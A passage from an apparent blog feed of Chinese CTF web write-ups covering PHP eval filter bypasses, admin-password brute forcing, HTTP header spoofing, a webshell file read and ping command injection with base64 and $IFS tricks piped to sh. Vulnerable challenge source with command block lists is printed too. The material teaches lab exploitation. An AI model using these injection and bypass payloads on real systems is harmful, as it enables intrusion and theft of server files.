class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-comment">//对我们输入的e_v.a.l参数进行过滤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用脚本爆破md5:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10000000</span>):<br>    md5 = hashlib.md5()<br>    s = <span class="hljs-built_in">str</span>(i)<br>    md5.update(s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    result = md5.hexdigest()<br>    <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;c4d038&quot;</span>:<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-built_in">print</span>(s)<br>    i = i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">c4d038b4bed09fdb1471ef51ec3a32cd<br>114514<br></code></pre></td></tr></table></figure><p>php非法传参介绍：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们传入的参数中存在_则会被php替换成[,但是我们传入的参数中是[则会被替换成_<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `l\s /`;//使用转义字符法绕过过滤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141744793.png" alt="image-20230927141744793"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `tac /fl\ag`;//在命令执行时\会被自动去除<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141826484.png" alt="image-20230927141826484"></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/images/2023-10-4-Newstar-1/image-20231001174106677.png" alt="image-20231001174106677"></p><p>发现用户登录界面，我们先注册一个账户,一般先注册一下admin,看一下这个系统中是否存在admin账户:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174230138.png" alt="image-20231001174230138"></p><p>发现已经存在admin账户，猜测网站可以使用弱密码本爆破，通过抓包，我们发现password的传输是通过md5的形式传输，所以我们需要md5弱密码本进行爆破:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204748276.png" alt="image-20231001204748276"></p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204814702.png" alt="image-20231001204814702"></p><p>最终我们通过在md5密码本中查找，发现admin的密码是000000</p><p>使用bp抓取登录信息:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001174542432.png" alt="image-20231001174542432"></p><p>点击发送，抓取第二个传输的包:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174616160.png" alt="image-20231001174616160"></p><p>将第二个包发送到重发器中,然后点击发送，获取响应信息:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174814623.png" alt="image-20231001174814623"></p><p>最终我们在302响应界面中发现被注释的flag信息</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS [Easy] ezhttp题解</title>
    <link href="/2023/09/25/2023-09-25-CNSS_ezhttp/"/>
    <url>/2023/09/25/2023-09-25-CNSS_ezhttp/</url>
    
    <content type="html"><![CDATA[<h3 id="CNSS-Easy-ezhttp"><a href="#CNSS-Easy-ezhttp" class="headerlink" title="CNSS  [Easy] ezhttp"></a>CNSS  [Easy] ezhttp</h3><p>1.查看题目描述:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814101917413.png" alt="image-20230814101917413"></p><p>这题考查的使http的请求，猜测可能是要对http的请求头的各个字段进行修改，则使用BP查看该网站的请求头</p><p>2.BP抓包该网站:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102106081.png" alt="image-20230814102106081"></p><p>查看响应的内容中，有提示:只接受CNSS请求，游览器一般的请求方式为GET和POST，这里只接受CNSS请求，说明要将GET改成CNSS:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102241202.png" alt="image-20230814102241202"></p><p>发现得到不同的响应结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只能在安卓微信内置浏览器中请求<br></code></pre></td></tr></table></figure><p>User-Agent:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102841034.png" alt="image-20230814102841034"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;<br></code></pre></td></tr></table></figure><p>浏览器通常使用的格式为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/&lt;version&gt; (&lt;system-information&gt;) &lt;platform&gt; (&lt;platform-details&gt;) &lt;extensions&gt;<br></code></pre></td></tr></table></figure><p>指令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;product&gt;<br>产品识别码。<br><br>&lt;product-version&gt;<br>产品版本号。<br><br>&lt;comment&gt;<br>零个或多个关于组成产品信息的注释。<br></code></pre></td></tr></table></figure><p>以火狐的UA为例:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103215869.png" alt="image-20230814103215869"></p><p>示例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0<br>Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0<br></code></pre></td></tr></table></figure><p>所以UA是用于表示该网页内容通过什么浏览器和设备进行访问的</p><p>由题目提示得:只能在安卓微信内置浏览器中请求.</p><p>所以我们得构造一个UA让其变为安卓微信内置浏览器中请求:<br>payload（通用）:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/5.0 (Linux; Android 10; XXX Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 MicroMessenger/8.0.0.1920(0x2800004D) Process/appbrand2 WeChat/arm32<br></code></pre></td></tr></table></figure><p>得到响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103557930.png" alt="image-20230814103557930"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自cnss.io的请求<br></code></pre></td></tr></table></figure><p>Referer：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104023049.png" alt="image-20230814104023049"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104054349.png" alt="image-20230814104054349"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104124465.png" alt="image-20230814104124465"></p><p>所以该headers字段表示的是当前页面的是通过哪个源页面中的链接进行访问的，提示得只接受来自cnss.io的请求</p><p>说明需要设置该页面的源页面为cnss.io：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:cnss.io<br></code></pre></td></tr></table></figure><p>由于当前页面的headers中没有Referer字段所以需要手动添加该字段:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104519850.png" alt="image-20230814104519850"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自本机的请求<br></code></pre></td></tr></table></figure><p>X-Forwarded-For:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104909323.png" alt="image-20230814104909323"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105227509.png" alt="image-20230814105227509"></p><p>实例：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195<br><br>X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,150.172.238.178<br></code></pre></td></tr></table></figure><p>由提示得只接受来自本机的请求，所以表示该页面的客户端IP地址需要是本机的IP地址即:127.0.0.1</p><p>所以可以伪造X-Forwarded-For的内容为本机地址:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105841408.png" alt="image-20230814105841408"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受内容类型为application/json的请求<br></code></pre></td></tr></table></figure><p>Content-Type:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110543771.png" alt="image-20230814110543771"></p><p>所以由提示得浏览器的发送内容的类型为:application&#x2F;json</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110832040.png" alt="image-20230814110832040"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">你倒是发个json过来啊<br></code></pre></td></tr></table></figure><p>json数据:<a href="https://zhuanlan.zhihu.com/p/74151127">JSON数据格式详解 - 知乎 (zhihu.com)</a>:</p><p>基本形式:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;obj1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//数值也需要加引号</span><br>    <span class="hljs-attr">&quot;obj3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">//嵌套型</span><br>        <span class="hljs-attr">&quot;obj4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value2&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj5&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据提示需要传送一个json数据，由于该游览器的请求为CNSS所以我们不知道该在哪里传输json数据，猜测该请求的传送数据格式和POST类似:</p><p>构造payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hacker&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814111723058.png" alt="image-20230814111723058"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的名字(name)吗？<br></code></pre></td></tr></table></figure><p>由于headers中不存在name字段，所以该字段需要我们通过json进行传输:<br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112529893.png" alt="image-20230814112529893"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的密码(password)吗？<br></code></pre></td></tr></table></figure><p>说明还需要传输一个password字段的值:</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112928181.png" alt="image-20230814112928181"></p><p>根据提示我们需要在Cookie中写上name字段的值,保险起见与json中的内容一致:</p><p>Cookie:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie">Cookie - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113511260.png" alt="image-20230814113511260"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie: &lt;cookie-list&gt;<br>Cookie: name=value<br>Cookie: name=value; name2=value2; name3=value3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113558180.png" alt="image-20230814113558180"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113202256.png" alt="image-20230814113202256"></p><p>根据提示需要在Cookie中添加password字段:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;;password=&quot;123456&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113321059.png" alt="image-20230814113321059"></p><p>BasicAuth认证<a href="https://zhuanlan.zhihu.com/p/64584734">秒懂HTTP基本认证(Basic Authentication) - 知乎 (zhihu.com)</a>：</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814123944756.png" alt="image-20230814123944756"></p><p>根据提示得我们需要进行BasicAuth认证，即认证我们输入的用户名和密码,需要添加Authorization字段:</p><p>admin:123456的base64格式为YWRtaW46MTIzNDU2</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Authorization: Basic YWRtaW46MTIzNDU2<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814124235654.png" alt="image-20230814124235654"></p><p>flag &#x3D; cnss{y0u_kn0w_h77p_r3qu3st_h4h4!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Polar秋季个人赛WEB_WP</title>
    <link href="/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"/>
    <url>/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Polar秋季个人赛WEB-WP"><a href="#Polar秋季个人赛WEB-WP" class="headerlink" title="Polar秋季个人赛WEB_WP"></a>Polar秋季个人赛WEB_WP</h1><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload:"></a>ezupload:</h4><p><img src="/images/2023-9-24-Polar/image-20230923092810825.png" alt="image-20230923092810825"></p><p>url:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://2469cefa-72d1-4f8f-a274-87b44a1cc826.www.polarctf.com:8090/uploads/pass1.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat ../flag.php&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923092840078.png" alt="image-20230923092840078"></p><h4 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h4><p>payload:</p><p>base64绕过法格式:使用$IFS$9代替空格，sh代替bash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><p>dir &#x2F;</p><p><img src="/images/2023-9-24-Polar/image-20230923101128445.png" alt="image-20230923101128445"></p><p>dir ..&#x2F;..&#x2F;:<br><img src="/images/2023-9-24-Polar/image-20230923101348330.png" alt="image-20230923101348330"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923102308231.png" alt="image-20230923102308231"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo cat ./index.php|base64 -d|bash<br>=&gt;使用base64绕过法<br>127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir$IFS$9..:返回上一级目录<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923101845558.png" alt="image-20230923101845558"></p><p>查看网页源代码:</p><p><img src="/images/2023-9-24-Polar/image-20230923101955812.png" alt="image-20230923101955812"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="hljs-meta">if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="hljs-meta">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="hljs-meta">if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-meta">print_r($match);</span><br><span class="hljs-meta">print($ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-meta">die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;空格我可没加难度这可真是复习，/斜眼笑&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;Bash is not allowed&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;我很抱歉，其实你得再研究研究&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">        else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;常用的读取命令肯定不行，你要是想出绕过的也算你厉害。但过滤机制是改了的-。-，你再研究研究？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;你要搞我？？？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="hljs-meta">die(&quot;那能让你直接读？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">$a = system(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">print_r($a);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="wu"><a href="#wu" class="headerlink" title="wu:"></a>wu:</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span 